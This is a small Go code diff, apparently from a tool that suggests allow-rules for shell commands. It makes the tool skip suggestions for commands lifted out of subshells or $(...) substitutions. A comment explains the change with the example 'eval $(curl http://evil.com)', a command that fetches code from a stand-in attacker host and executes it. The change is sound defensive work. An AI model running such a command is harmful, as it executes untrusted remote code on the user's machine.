@@ -87,6 +87,13 @@ func suggestFromParsedCommands(commands []parsedCommand, max int) []string {
 		if len(suggestions) >= max {
 			break
 		}
+		// Only suggest rules for commands the user runs directly. One lifted out
+		// of a subshell or substitution ($(...)) is an operand of the outer
+		// command — suggesting an allow-rule for it would, e.g., propose a curl
+		// rule extracted from a dangerous "eval $(curl http://evil.com)".
+		if cmd.InSubshell {
+			continue
+		}
 		if hasMultiple && cmd.Name == "cd" {
 			continue
 		}
